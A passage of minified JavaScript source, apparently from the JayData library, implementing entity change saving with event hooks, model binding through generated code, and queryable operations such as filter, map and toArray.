trackedEntities=[];for(var i=0;i<additionalEntities.length;i++){var item=additionalEntities[i];if(!skipItems.some(function(entity){return entity==item;})){if(!changedEntities.some(function(entity){return entity.data==item;})){trackedEntities.push({data:item,entitySet:this.getEntitySetFromElementType(item.getType().name)});}}}}
for(var j=0;j<changedEntities.length;j++){var d=changedEntities[j];if(d.dependentOn){var temp=[];for(var i=0;i<d.dependentOn.length;i++){if(skipItems.indexOf(d.dependentOn[i])<0){temp.push(d.dependentOn[i]);}}
d.dependentOn=temp;}}
skipItems=null;var ctx=this;if(changedEntities.length==0){this.stateManager.trackedEntities.length=0;ctx._applyTransaction(clbWrapper,clbWrapper.success,[0],transaction,returnTransaction);return pHandlerResult;}
var errors=[];for(var i=0;i<changedEntities.length;i++){var entity=changedEntities[i];if(entity.data.entityState===$data.EntityState.Added){for(var j=0;j<entity.data.getType().memberDefinitions.getPublicMappedProperties().length;j++){var memDef=entity.data.getType().memberDefinitions.getPublicMappedProperties()[j];var memDefType=Container.resolveType(memDef.type);if(memDef.required&&!memDef.computed&&!entity.data[memDef.name]){switch(memDefType){case $data.String:case $data.Number:case $data.Integer:case $data.Date:case $data.Boolean:entity.data[memDef.name]=Container.getDefault(memDef.dataType);break;default:break;}}}}
if((entity.data.entityState===$data.EntityState.Added||entity.data.entityState===$data.EntityState.Modified)&&!entity.data.isValid()){errors.push({item:entity.data,errors:entity.data.ValidationErrors});}}
if(errors.length>0){clbWrapper.error(errors);return pHandlerResult;}
var access=$data.Access.None;var eventData={};var sets=[];for(var i=0;i<changedEntities.length;i++){var it=changedEntities[i];var n=it.entitySet.elementType.name;sets.push(it.entitySet.name);var es=this._entitySetReferences[n];if(es.beforeCreate||es.beforeUpdate||es.beforeDelete||(this.user&&this.checkPermission)){if(!eventData[n])eventData[n]={};switch(it.data.entityState){case $data.EntityState.Added:access|=$data.Access.Create;if(es.beforeCreate){if(!eventData[n].createAll)eventData[n].createAll=[];eventData[n].createAll.push(it);}
break;case $data.EntityState.Modified:access|=$data.Access.Update;if(es.beforeUpdate){if(!eventData[n].modifyAll)eventData[n].modifyAll=[];eventData[n].modifyAll.push(it);}
break;case $data.EntityState.Deleted:access|=$data.Access.Delete;if(es.beforeDelete){if(!eventData[n].deleteAll)eventData[n].deleteAll=[];eventData[n].deleteAll.push(it);}
break;}}}
var readyFn=function(cancel){if(cancel===false){cancelEvent='async';changedEntities.length=0;}
if(changedEntities.length){var innerCallback={success:function(tran){ctx._postProcessSavedItems(clbWrapper,changedEntities,tran,returnTransaction);},error:function(){if(returnTransaction)
clbWrapper.error.apply(this,arguments);else
clbWrapper.error.apply(this,Array.prototype.filter.call(arguments,function(p){return!(p instanceof $data.Transaction);}));}};if(transaction instanceof $data.Transaction){ctx.storageProvider.saveChanges(innerCallback,changedEntities,transaction);}else{ctx.beginTransaction(true,function(tran){ctx.storageProvider.saveChanges(innerCallback,changedEntities,tran);});}}else if(cancelEvent){clbWrapper.error(new Exception('Cancelled event in '+cancelEvent,'CancelEvent'));}else{ctx._applyTransaction(clbWrapper,clbWrapper.success,[0],transaction,returnTransaction);};};var cancelEvent;var ies=Object.getOwnPropertyNames(eventData);var i=0;var cmd=['beforeUpdate','beforeDelete','beforeCreate'];var cmdAll={beforeCreate:'createAll',beforeDelete:'deleteAll',beforeUpdate:'modifyAll'};var callbackFn=function(cancel){if(cancel===false){cancelEvent='async';changedEntities.length=0;readyFn(cancel);return;}
var es=ctx._entitySetReferences[ies[i]];var c=cmd.pop();var ed=eventData[ies[i]];var all=ed[cmdAll[c]];if(all){var m=[];for(var im=0;im<all.length;im++){m.push(all[im].data);}
if(!cmd.length){cmd=['beforeUpdate','beforeDelete','beforeCreate'];i++;}
var r=es[c].call(ctx,m);if(typeof r==='function'){r.call(ctx,(i<ies.length&&!cancelEvent)?callbackFn:readyFn,m);}else if(r===false){cancelEvent=(es.name+'.'+c);for(var index=0;index<all.length;index++){var it=all[index];var ix=changedEntities.indexOf(it);changedEntities.splice(ix,1);}
readyFn();}else{if(i<ies.length&&!cancelEvent)callbackFn();else readyFn();}}else{if(!cmd.length){cmd=['beforeUpdate','beforeDelete','beforeCreate'];i++;}
if(i<ies.length&&!cancelEvent)callbackFn();else readyFn();}};if(this.user&&this.checkPermission){this.checkPermission(access,this.user,sets,{success:function(){if(i<ies.length)callbackFn();else readyFn();},error:clbWrapper.error});}else{if(i<ies.length)callbackFn();else readyFn();}
return pHandlerResult;},processEntityTypeBeforeEventHandler:function(skipItems,entityCachedItem){if(!entityCachedItem.skipSave){var entity=entityCachedItem.data;var entityType=entity.getType();var state=entity.entityState;switch(true){case state===$data.EntityState.Added&&entityType.onbeforeCreate instanceof $data.Event:if(entityType.onbeforeCreate.fireCancelAble(entity)===false){entityCachedItem.skipSave=true;skipItems.push(entity);}
break;case state===$data.EntityState.Modified&&entityType.onbeforeUpdate instanceof $data.Event:if(entityType.onbeforeUpdate.fireCancelAble(entity)===false){entityCachedItem.skipSave=true;skipItems.push(entity);}
break;case state===$data.EntityState.Deleted&&entityType.onbeforeDelete instanceof $data.Event:if(entityType.onbeforeDelete.fireCancelAble(entity)===false){entityCachedItem.skipSave=true;skipItems.push(entity);}
break;default:break;}}},processEntityTypeAfterEventHandler:function(entityCachedItem){var entity=entityCachedItem.data;var entityType=entity.getType();var state=entity.entityState;switch(true){case state===$data.EntityState.Added&&entityType.onafterCreate instanceof $data.Event:entityType.onafterCreate.fire(entity);break;case state===$data.EntityState.Modified&&entityType.onafterUpdate instanceof $data.Event:entityType.onafterUpdate.fire(entity);break;case state===$data.EntityState.Deleted&&entityType.onafterDelete instanceof $data.Event:entityType.onafterDelete.fire(entity);break;default:break;}},prepareRequest:function(){},_postProcessSavedItems:function(callBack,changedEntities,transaction,returnTransaction){if(this.ChangeCollector&&this.ChangeCollector instanceof $data.Notifications.ChangeCollectorBase)
this.ChangeCollector.processChangedData(changedEntities);var eventData={};var ctx=this;for(var i=0;i<changedEntities.length;i++){var entity=changedEntities[i];this.processEntityTypeAfterEventHandler(entity);var oes=entity.data.entityState;entity.data.entityState=$data.EntityState.Unchanged;entity.data.changedProperties=[];entity.physicalData=undefined;var n=entity.entitySet.elementType.name;var es=ctx._entitySetReferences[n];var eventName=undefined;switch(oes){case $data.EntityState.Added:eventName='added';break;case $data.EntityState.Deleted:eventName='deleted';break;case $data.EntityState.Modified:eventName='updated';break;}
if(eventName){this.raiseEvent(eventName,entity);}
if(es.afterCreate||es.afterUpdate||es.afterDelete){if(!eventData[n])eventData[n]={};switch(oes){case $data.EntityState.Added:if(es.afterCreate){if(!eventData[n].createAll)eventData[n].createAll=[];eventData[n].createAll.push(entity);}
break;case $data.EntityState.Modified:if(es.afterUpdate){if(!eventData[n].modifyAll)eventData[n].modifyAll=[];eventData[n].modifyAll.push(entity);}
break;case $data.EntityState.Deleted:if(es.afterDelete){if(!eventData[n].deleteAll)eventData[n].deleteAll=[];eventData[n].deleteAll.push(entity);}
break;}}}
var ies=Object.getOwnPropertyNames(eventData);var i=0;var ctx=this;var cmd=['afterUpdate','afterDelete','afterCreate'];var cmdAll={afterCreate:'createAll',afterDelete:'deleteAll',afterUpdate:'modifyAll'};var readyFn=function(){if(!ctx.trackChanges){ctx.stateManager.reset();}
ctx._applyTransaction(callBack,callBack.success,[changedEntities.length],transaction,returnTransaction);};var callbackFn=function(){var es=ctx._entitySetReferences[ies[i]];var c=cmd.pop();var ed=eventData[ies[i]];var all=ed[cmdAll[c]];if(all){var m=[];for(var im=0;im<all.length;im++){m.push(all[im].data);}
if(!cmd.length){cmd=['afterUpdate','afterDelete','afterCreate'];i++;}
var r=es[c].call(ctx,m);if(typeof r==='function'){r.call(ctx,i<ies.length?callbackFn:readyFn,m);}else{if(i<ies.length)callbackFn();else readyFn();}}else{if(!cmd.length){cmd=['afterUpdate','afterDelete','afterCreate'];i++;}
if(i<ies.length)callbackFn();else readyFn();}};if(i<ies.length)callbackFn();else readyFn();},forEachEntitySet:function(fn,ctx){for(var entitySetName in this._entitySetReferences){var actualEntitySet=this._entitySetReferences[entitySetName];fn.call(ctx,actualEntitySet);}},loadItemProperty:function(entity,property,callback,transaction){Guard.requireType('entity',entity,$data.Entity);var memberDefinition=typeof property==='string'?entity.getType().memberDefinitions.getMember(property):property;var returnTransaction=this._isReturnTransaction(transaction);if(entity[memberDefinition.name]!=undefined){var pHandler=new $data.PromiseHandler();callBack=pHandler.createCallback(callback);this._applyTransaction(callback,callback.success,[entity[memberDefinition.name]],transaction,returnTransaction);return pHandler.getPromise();}
var isSingleSide=true;var storageModel=this._storageModel.getStorageModel(entity.getType().fullName);var elementType=Container.resolveType(memberDefinition.dataType);if(elementType===$data.Array||(elementType.isAssignableTo&&elementType.isAssignableTo($data.EntitySet))){elementType=Container.resolveType(memberDefinition.elementType);isSingleSide=false;}else{var associations;for(var i=0;i<storageModel.Associations.length;i++){var assoc=storageModel.Associations[i];if(assoc.FromPropertyName==memberDefinition.name){associations=assoc;break;}}
if(associations&&associations.FromMultiplicity==="0..1"&&associations.ToMultiplicity==="1")
isSingleSide=false;}
var keyProp=storageModel.LogicalType.memberDefinitions.getKeyProperties();if(isSingleSide===true){var filterFunc="function (e) { return";var filterParams={};for(var index=0;index<keyProp.length;index++){var memDefKey=keyProp[index];if(index>0)
filterFunc+=' &&';filterFunc+=" e."+memDefKey.name+" == this.key"+index;filterParams['key'+index]=entity[memDefKey.name];}
filterFunc+="; }"
var entitySet=this.getEntitySetFromElementType(entity.getType());return entitySet.map('function (e) { return e.'+memberDefinition.name+' }').single(filterFunc,filterParams,callback,transaction);}else{var filterFunc="function (e) { return"
var filterParams={};for(var index=0;index<keyProp.length;index++){var memDefKey=keyProp[index];if(index>0)
filterFunc+=' &&';filterFunc+=" e."+memberDefinition.inverseProperty+"."+memDefKey.name+" == this.key"+index;filterParams['key'+index]=entity[memDefKey.name];}
filterFunc+="; }"
var entitySet=this.getEntitySetFromElementType(elementType);return entitySet.filter(filterFunc,filterParams).toArray(callback,transaction);}},getTraceString:function(queryable){var query=new $data.Query(queryable.expression,queryable.defaultType,this);return this.storageProvider.getTraceString(query);},log:function(logInfo){},resolveBinaryOperator:function(operator,expression,frameType){return this.storageProvider.resolveBinaryOperator(operator,expression,frameType);},resolveUnaryOperator:function(operator,expression,frameType){return this.storageProvider.resolveUnaryOperator(operator,expression,frameType);},resolveFieldOperation:function(operation,expression,frameType){return this.storageProvider.resolveFieldOperation(operation,expression,frameType);},resolveSetOperations:function(operation,expression,frameType){return this.storageProvider.resolveSetOperations(operation,expression,frameType);},resolveTypeOperations:function(operation,expression,frameType){return this.storageProvider.resolveTypeOperations(operation,expression,frameType);},resolveContextOperations:function(operation,expression,frameType){return this.storageProvider.resolveContextOperations(operation,expression,frameType);},_generateServiceOperationQueryable:function(functionName,returnEntitySet,arg,parameters){if(typeof console!=='undefined'&&console.log)
console.log('Obsolate: _generateServiceOperationQueryable, $data.EntityContext');var params=[];for(var i=0;i<parameters.length;i++){var obj={};obj[parameters[i]]=Container.resolveType(Container.getTypeName(arg[i]));params.push(obj);}
var tempOperation=$data.EntityContext.generateServiceOperation({serviceName:functionName,returnType:$data.Queryable,elementType:this[returnEntitySet].elementType,params:params});return tempOperation.apply(this,arg);},attach:function(entity,keepChanges){if(entity instanceof $data.EntityWrapper){entity=entity.getEntity();}
var entitySet=this.getEntitySetFromElementType(entity.getType());return entitySet.attach(entity,keepChanges);},attachOrGet:function(entity){if(entity instanceof $data.EntityWrapper){entity=entity.getEntity();}
var entitySet=this.getEntitySetFromElementType(entity.getType());return entitySet.attachOrGet(entity);},addMany:function(entities){var self=this;entities.forEach(function(entity){self.add(entity);});return entities;},add:function(entity){if(entity instanceof $data.EntityWrapper){entity=entity.getEntity();}
var entitySet=this.getEntitySetFromElementType(entity.getType());return entitySet.add(entity);},remove:function(entity){if(entity instanceof $data.EntityWrapper){entity=entity.getEntity();}
var entitySet=this.getEntitySetFromElementType(entity.getType());return entitySet.remove(entity);},storeToken:{type:Object}},{generateServiceOperation:function(cfg){var fn;if(cfg.serviceMethod){var returnType=cfg.returnType?Container.resolveType(cfg.returnType):{};if(returnType.isAssignableTo&&returnType.isAssignableTo($data.Queryable)){fn=cfg.serviceMethod;}else{fn=function(){var lastParam=arguments[arguments.length-1];var pHandler=new $data.PromiseHandler();var cbWrapper;var args=arguments;if(typeof lastParam==='function'){cbWrapper=pHandler.createCallback(lastParam);arguments[arguments.length-1]=cbWrapper;}else{cbWrapper=pHandler.createCallback();arguments.push(cbWrapper);}
try{var result=cfg.serviceMethod.apply(this,arguments);if(result!==undefined)
cbWrapper.success(result);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();}}}else{fn=function(){var context=this;var bindedEntity;if(this instanceof $data.Entity){if(this.context){context=this.context;}else{Guard.raise('entity not attached into context');return;}
bindedEntity={data:this,entitySet:context.getEntitySetFromElementType(this.getType())};}
var virtualEntitySet=cfg.elementType?context.getEntitySetFromElementType(Container.resolveType(cfg.elementType)):null;var paramConstExpression=null;if(cfg.params){paramConstExpression=[];for(var i=0;i<cfg.params.length;i++){for(var name in cfg.params[i]){paramConstExpression.push(Container.createConstantExpression(arguments[i],Container.resolveType(cfg.params[i][name]),name));}}}
var ec=Container.createEntityContextExpression(context);var memberdef=(bindedEntity?bindedEntity.data:context).getType().getMemberDefinition(cfg.serviceName);var es=Container.createServiceOperationExpression(ec,Container.createMemberInfoExpression(memberdef),paramConstExpression,cfg,bindedEntity);var clb=arguments[arguments.length-1];if(typeof clb!=='function'){clb=undefined;}
if(virtualEntitySet){var q=Container.createQueryable(virtualEntitySet,es);if(clb){es.isTerminated=true;return q._runQuery(clb);}
return q;}
else{var returnType=cfg.returnType?Container.resolveType(cfg.returnType):null;var q=Container.createQueryable(context,es);q.defaultType=returnType||$data.Object;if(returnType===$data.Queryable){q.defaultType=Container.resolveType(cfg.elementType);if(clb){es.isTerminated=true;return q._runQuery(clb);}
return q;}
es.isTerminated=true;return q._runQuery(clb);}};};var params=[];if(cfg.params){for(var i=0;i<cfg.params.length;i++){var param=cfg.params[i];for(var name in param){params.push({name:name,type:param[name]});}}}
$data.typeSystem.extend(fn,cfg,{params:params});return fn;},_convertLogicalTypeNameToPhysical:function(name){return name+'_$db$';},_storageModelCache:{get:function(){if(!this.__storageModelCache)
this.__storageModelCache={};return this.__storageModelCache;},set:function(){}}});$data.Class.define('$data.QueryProvider',null,null,{constructor:function(){this.requiresExpressions=false},executeQuery:function(queryable,resultHandler){},getTraceString:function(queryable){}},null);$data.Class.define('$data.ModelBinder',null,null,{constructor:function(context){this.context=context;this.providerName=null;if(this.context.storageProvider&&typeof this.context.storageProvider.getType==='function'){this.references=!(this.context.storageProvider.providerConfiguration.modelBinderOptimization||false);for(var i in $data.RegisteredStorageProviders){if($data.RegisteredStorageProviders[i]===this.context.storageProvider.getType()){this.providerName=i;}}}},_deepExtend:function(o,r){if(o===null||o===undefined){return r;}
for(var i in r){if(o.hasOwnProperty(i)){if(typeof r[i]==='object'){if(Array.isArray(r[i])){for(var j=0;j<r[i].length;j++){if(o[i].indexOf(r[i][j])<0){o[i].push(r[i][j]);}}}else this._deepExtend(o[i],r[i]);}}else{o[i]=r[i];}}
if(o instanceof $data.Entity)
o.changedProperties=undefined;return o;},_buildSelector:function(meta,context){if(meta.$selector){if(!(Array.isArray(meta.$selector))){meta.$selector=[meta.$selector];}
for(var i=0;i<meta.$selector.length;i++){var selector=meta.$selector[i].replace('json:','');context.src+='if(';var path=selector.split('.');for(var j=0;j<path.length;j++){context.src+='di.'+path.slice(0,j+1).join('.')+(j<path.length-1?' && ':' !== undefined && typeof di.'+selector+' === "object"');}
context.src+='){di = di.'+selector+';}'+(i<meta.$selector.length-1?'else ':'');}
context.src+='if (di === null){';if(context.iter)context.src+=context.iter+' = null;';context.src+='return null;';context.src+='}';}},_buildKey:function(name,type,keys,context,data){if(keys){var type=Container.resolveType(type);type=type.fullName||type.name;context.src+='var '+name+'Fn = function(di){';if(!(Array.isArray(keys))||keys.length==1){if(typeof keys!=='string')keys=keys[0];context.src+='if (typeof di.'+keys+' === "undefined") return undefined;';context.src+='if (di.'+keys+' === null) return null;';context.src+='var key = ("'+type+'_'+keys+'#" + di.'+keys+');';}else{context.src+='var key = "";';for(var i=0;i<keys.length;i++){var id=typeof keys[i]!=='object'?keys[i]:keys[i].$source;context.src+='if (typeof di.'+id+' === "undefined") return undefined;';context.src+='if (di.'+id+' === null) return null;';context.src+='key += ("'+type+'_'+id+'#" + di.'+id+');';}}
context.src+='return key;};';}
context.src+='var '+name+' = '+(keys?name+'Fn('+(data||'di')+')':'undefined')+';';},build:function(meta,context){if(meta.$selector){if(!(Array.isArray(meta.$selector)))meta.$selector=[meta.$selector];for(var i=0;i<meta.$selector.length;i++){meta.$selector[i]=meta.$selector[i].replace('json:','');}}
if(meta.$value){if(typeof meta.$value==='function'){context.src+='var fn = function(){ return meta'+(context.meta.length?'.'+context.meta.join('.'):'')+'.$value.call(self, meta'+(context.meta.length?'.'+context.meta.join('.'):'')+', di); };';context.item='fn()';}else if(meta.$type){var type=Container.resolveName(Container.resolveType(meta.$type));var converter=this.context.storageProvider.fieldConverter.fromDb[type];if(converter){context.item='self.context.storageProvider.fieldConverter.fromDb["'+type+'"]('+meta.$value+')';}else{context.item='new '+type+'('+meta.$value+')';}}else context.item=meta.$value;}else if(meta.$source){var type=Container.resolveName(Container.resolveType(meta.$type));var converter=this.context.storageProvider.fieldConverter.fromDb[type];var item='_'+type.replace(/\./gi,'_')+'_';if(!context.forEach)context.src+='var di = data;';context.item=item;this._buildSelector(meta,context);if(converter){context.src+='var '+item+' = self.context.storageProvider.fieldConverter.fromDb["'+type+'"](di.'+meta.$source+');';}else{context.src+='var '+item+' = new '+type+'(di.'+meta.$source+');';}}else if(meta.$item){context.meta.push('$item');var iter=(context.item&&context.current?context.item+'.'+context.current:(context.item?context.item:'result'));if(iter.indexOf('.')<0)context.src+='var '+iter+';';context.src+='var fn = function(di){';if(meta.$selector){context.src+='if (typeof di !== "undefined" && !(Array.isArray(di))){';this._buildSelector(meta,context);context.src+='}';}
if(this.references&&meta.$keys)this._buildKey('forKey',meta.$type,meta.$keys,context);context.src+=iter+' = typeof '+iter+' == "undefined" ? [] : '+iter+';';context.iter=iter;if(this.references&&meta.$item.$keys){var keycacheName='keycache_'+iter.replace(/\./gi,'_');context.src+='var '+keycacheName+';';context.src+='var kci = keycacheIter.indexOf('+iter+');';context.src+='if (kci < 0){';context.src+=keycacheName+' = [];';context.src+='keycache.push('+keycacheName+');';context.src+='keycacheIter.push('+iter+');';context.src+='}else{';context.src+=keycacheName+' = keycache[kci];';context.src+='}';}
context.iter=undefined;context.forEach=true;var itemForKey='itemForKey_'+iter.replace(/\./gi,'_');context.src+='var forEachFn = function(di, i){';context.src+='var diBackup = di;';if(this.providerName=="sqLite"&&this.references&&meta.$item.$keys)this._buildKey(itemForKey,meta.$type,meta.$item.$keys,context);var item=context.item||'iter';context.item=item;if(!meta.$item.$source){this._buildSelector(meta.$item,context);}
this.build(meta.$item,context);if(this.references&&meta.$keys){context.src+='if (forKey){';context.src+='if (cache[forKey]){';context.src+=iter+' = cache[forKey];';context.src+='if ('+iter+'.indexOf('+(context.item||item)+') < 0){';context.src+=iter+'.push('+(context.item||item)+');';context.src+='}}else{';context.src+='cache[forKey] = '+iter+';';context.src+=iter+'.push('+(context.item||item)+');';context.src+='}}else{';if(this.references&&meta.$item.$keys)this._buildKey('cacheKey',meta.$type,meta.$item.$keys,context,'diBackup');context.src+='if (typeof cacheKey != "undefined" && cacheKey !== null){';context.src+='if (keycache_'+iter.replace(/\./gi,'_')+' && cacheKey){';context.src+='if (keycache_'+iter.replace(/\./gi,'_')+'.indexOf(cacheKey) < 0){';context.src+=iter+'.push('+(context.item||item)+');';context.src+='keycache_'+iter.replace(/\./gi,'_')+'.push(cacheKey);';context.src+='}';context.src+='}else{';context.src+=iter+'.push('+(context.item||item)+');';context.src+='}';context.src+='}';context.src+='}';}else{if(this.references&&meta.$item.$keys){context.src+='if (typeof '+itemForKey+' !== "undefined" && '+itemForKey+' !== null){';context.src+='if (typeof keycache_'+iter.replace(/\./gi,'_')+' !== "undefined" && '+itemForKey+'){';context.src+='if (keycache_'+iter.replace(/\./gi,'_')+'.indexOf('+itemForKey+') < 0){';context.src+=iter+'.push('+(context.item||item)+');';context.src+='keycache_'+iter.replace(/\./gi,'_')+'.push('+itemForKey+');'
context.src+='}}else{';context.src+=iter+'.push('+(context.item||item)+');';context.src+='}}else{';context.src+=iter+'.push('+(context.item||item)+');';context.src+='}';}else{context.src+=iter+'.push('+(context.item||item)+');';}}
context.src+='};';context.src+='if (Array.isArray(di)) di.forEach(forEachFn);';context.src+='else forEachFn(di, 0);';context.forEach=false;context.item=null;context.src+='};fn(typeof di === "undefined" ? data : di);'
context.meta.pop();}else if(meta.$type){if(!context.forEach){context.src+='if (typeof di === "undefined"){';context.src+='var di = data;';this._buildSelector(meta,context);context.src+='}';}
var resolvedType=Container.resolveType(meta.$type);var type=Container.resolveName(resolvedType);var isEntityType=resolvedType.isAssignableTo&&resolvedType.isAssignableTo($data.Entity);var item='_'+type.replace(/\./gi,'_')+'_';if(context.item==item)item+='new_';context.item=item;var isPrimitive=false;if(!meta.$source&&!meta.$value&&resolvedType!==$data.Array&&resolvedType!==$data.Object&&!resolvedType.isAssignableTo)
isPrimitive=true;if(resolvedType===$data.Object||resolvedType===$data.Array){var keys=Object.keys(meta);if(keys.length==1||(keys.length==2&&meta.$selector))isPrimitive=true;}
if(isPrimitive){var converter=this.context.storageProvider.fieldConverter.fromDb[type];if(converter){context.src+='var '+item+' = di != undefined ? self.context.storageProvider.fieldConverter.fromDb["'+type+'"](di) : di;';}else{context.src+='var '+item+' = di;';}}else{if(this.references&&meta.$keys){this._buildKey('itemKey',meta.$type,meta.$keys,context);context.src+='if (itemKey === null) return null;';context.src+='var '+item+';';context.src+='if (itemKey && cache[itemKey]){';context.src+=item+' = cache[itemKey];';context.src+='}else{';if(isEntityType){context.src+=item+' = new '+type+'(undefined, { setDefaultValues: false });';}else{context.src+=item+' = new '+type+'();';}
context.src+='if (itemKey){';context.src+='cache[itemKey] = '+item+';';context.src+='}';context.src+='}';}else{if(isEntityType){context.src+='var '+item+' = new '+type+'(undefined, { setDefaultValues: false });';}else{context.src+='var '+item+' = new '+type+'();';}}}
for(var i in meta){if(i.indexOf('$')<0){context.current=i;if(!meta[i].$item){if(meta[i].$value){context.meta.push(i);var item=context.item;this.build(meta[i],context);context.src+=item+'.'+i+' = '+context.item+';';context.item=item;context.meta.pop();}else if(meta[i].$source){context.src+='var fn = function(di){';this._buildSelector(meta[i],context);if(meta[i].$type){var type=Container.resolveName(Container.resolveType(meta[i].$type));var converter=this.context.storageProvider.fieldConverter.fromDb[type];if(converter){context.src+='return self.context.storageProvider.fieldConverter.fromDb["'+type+'"](di.'+meta[i].$source+');';}else{context.src+='return new '+type+'(di.'+meta[i].$source+');';}}else{context.src+=item+'.'+i+' = di.'+meta[i].$source+';';}
context.src+='};';if(meta[i].$type)context.src+=item+'.'+i+' = fn(di);';else context.src+='fn(di);';}else if(meta[i].$type){context.meta.push(i);context.src+='var fn = function(di){';this._buildSelector(meta[i],context);this.build(meta[i],context);context.src+='return '+context.item+';};';if(meta[i].$type===$data.Object)context.src+=item+'.'+i+' = self._deepExtend('+item+'.'+i+', fn(di));';else context.src+=item+'.'+i+' = fn(di);';context.item=item;context.meta.pop();}else if(meta.$type){var memDef=Container.resolveType(meta.$type).memberDefinitions.getMember(i);var type=Container.resolveName(memDef.type);var entityType=Container.resolveName(Container.resolveType(meta.$type));var converter=this.context.storageProvider.fieldConverter.fromDb[type];if(this.providerName&&memDef&&memDef.converter&&memDef.converter[this.providerName]&&typeof memDef.converter[this.providerName].fromDb=='function'){context.src+=item+'.'+i+' = Container.resolveType("'+entityType+'").memberDefinitions.getMember("'+i+'").converter.'+this.providerName+'.fromDb(di.'+meta[i]+', Container.resolveType("'+entityType+'").memberDefinitions.getMember("'+i+'"), self.context, Container.resolveType("'+entityType+'"));';}else if(converter){context.src+=item+'.'+i+' = self.context.storageProvider.fieldConverter.fromDb["'+type+'"](di.'+meta[i]+');';}else{var type=Container.resolveName(Container.resolveType(type.memberDefinitions.getMember(i).type));context.src+=item+'.'+i+' = new '+type+'(di.'+meta[i]+');';}}}else{context.meta.push(i);this.build(meta[i],context);context.item=item;context.meta.pop();}}}
if(this.references&&meta.$keys){context.src+='if ('+item+' instanceof $data.Entity){'+item+'.changedProperties = undefined;}';}else{context.src+='if ('+item+' instanceof $data.Entity){'+item+'.changedProperties = undefined;}';}}},call:function(data,meta){if(!Object.getOwnPropertyNames(meta).length){return data;}
var context={src:'',meta:[]};context.src+='var self = this;';context.src+='var result;';context.src+='var cache = {};';context.src+='var keycache = [];';context.src+='var keycacheIter = [];';this.build(meta,context);if(context.item)context.src+='if (!result) result = '+context.item+';';context.src+='return result;';var fn=new Function('meta','data',context.src).bind(this);var ret=fn(meta,data);return ret;}});$C('$data.queryBuilder',null,null,{constructor:function(){this._fragments={};this.selectedFragment=null;this._binderConfig={};this.modelBinderConfig=this._binderConfig;this._binderConfigPropertyStack=[];},selectTextPart:function(name){if(!this._fragments[name]){this._fragments[name]={text:'',params:[]};}
this.selectedFragment=this._fragments[name];},getTextPart:function(name){return this._fragments[name];},addText:function(textParticle){this.selectedFragment.text+=textParticle;},addParameter:function(param){this.selectedFragment.params.push(param);},selectModelBinderProperty:function(name){this._binderConfigPropertyStack.push(this.modelBinderConfig);if(!(name in this.modelBinderConfig)){this.modelBinderConfig[name]={};}
this.modelBinderConfig=this.modelBinderConfig[name];},popModelBinderProperty:function(){if(this._binderConfigPropertyStack.length===0){this.modelBinderConfig=this._binderConfig();}else{this.modelBinderConfig=this._binderConfigPropertyStack.pop();}},resetModelBinderProperty:function(name){this._binderConfigPropertyStack=[];this.modelBinderConfig=this._binderConfig;},addKeyField:function(name){if(!this.modelBinderConfig['$keys']){this.modelBinderConfig['$keys']=new Array();}
this.modelBinderConfig['$keys'].push(name);}});$C('$data.Query',null,null,{constructor:function(expression,defaultType,context){this.expression=expression;this.context=context;this.expressions=expression;this.defaultType=defaultType;this.result=[];this.rawDataList=[];this.modelBinderConfig={};this.context=context;},rawDataList:{dataType:"Array"},result:{dataType:"Array"},resultType:{},buildResultSet:function(ctx){var converter=new $data.ModelBinder(this.context);this.result=converter.call(this.rawDataList,this.modelBinderConfig);return;},getEntitySets:function(){var ret=[];var ctx=this.context;var fn=function(expression){if(expression instanceof $data.Expressions.EntitySetExpression){if(ret.indexOf(ctx._entitySetReferences[expression.elementType.name])<0)
ret.push(ctx._entitySetReferences[expression.elementType.name]);}
if(expression.source)fn(expression.source);};fn(this.expression);return ret;}},null);$data.Class.define('$data.Queryable',null,null,{constructor:function(source,rootExpression){var context=source instanceof $data.EntityContext?source:source.entityContext;this.defaultType=source instanceof $data.EntityContext?null:source.defaultType;this.entityContext=context;this.expression=rootExpression;},filter:function(predicate,thisArg){this._checkOperation('filter');var expression=Container.createCodeExpression(predicate,thisArg);var expressionSource=this.expression;if(this.expression instanceof $data.Expressions.FilterExpression){expressionSource=this.expression.source;var operatorResolution=this.entityContext.storageProvider.resolveBinaryOperator("and");expression=Container.createSimpleBinaryExpression(this.expression.selector,expression,"and","filter","boolean",operatorResolution);}
var exp=Container.createFilterExpression(expressionSource,expression);var q=Container.createQueryable(this,exp);return q;},where:function(predicate,params){return this.filter(predicate,params);},map:function(projection,thisArg,mappedTo){this._checkOperation('map');var codeExpression=Container.createCodeExpression(projection,thisArg);var exp=Container.createProjectionExpression(this.expression,codeExpression);if(mappedTo==='default')
exp.projectionAs=this.defaultType;else if(mappedTo)
exp.projectionAs=Container.resolveType(mappedTo);else
exp.projectionAs=$data.Object;var q=Container.createQueryable(this,exp);return q;},select:function(projection,thisArg,mappedTo){return this.map(projection,thisArg,mappedTo);},length:function(onResult,transaction){this._checkOperation('length');var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var countExpression=Container.createCountExpression(this.expression);var preparator=Container.createQueryExpressionCreator(this.entityContext);try{var expression=preparator.Visit(countExpression);this.entityContext.log({event:"EntityExpression",data:expression});this.entityContext.executeQuery(Container.createQueryable(this,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},count:function(onResult,transaction){return this.length(onResult,transaction);},forEach:function(iterator,transaction){this._checkOperation('forEach');var pHandler=new $data.PromiseHandler();function iteratorFunc(items){items.forEach(iterator);}
var cbWrapper=pHandler.createCallback(iteratorFunc);var forEachExpression=Container.createForEachExpression(this.expression);var preparator=Container.createQueryExpressionCreator(this.entityContext);try{var expression=preparator.Visit(forEachExpression);this.entityContext.log({event:"EntityExpression",data:expression});this.entityContext.executeQuery(Container.createQueryable(this,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},toArray:function(onResult_items,transaction){if(onResult_items instanceof $data.Array)
{return this.toArray(function(results){onResult_items.length=0;results.forEach(function(item,idx){onResult_items.push(item);});});}
this._checkOperation('toArray');var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult_items);var toArrayExpression=Container.createToArrayExpression(this.expression);var preparator=Container.createQueryExpressionCreator(this.entityContext);try{var expression=preparator.Visit(toArrayExpression);this.entityContext.log({event:"EntityExpression",data:expression});this.entityContext.executeQuery(Container.createQueryable(this,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},single:function(filterPredicate,thisArg,onResult,transaction){this._checkOperation('single');var q=this;if(filterPredicate){q=this.filter(filterPredicate,thisArg);}
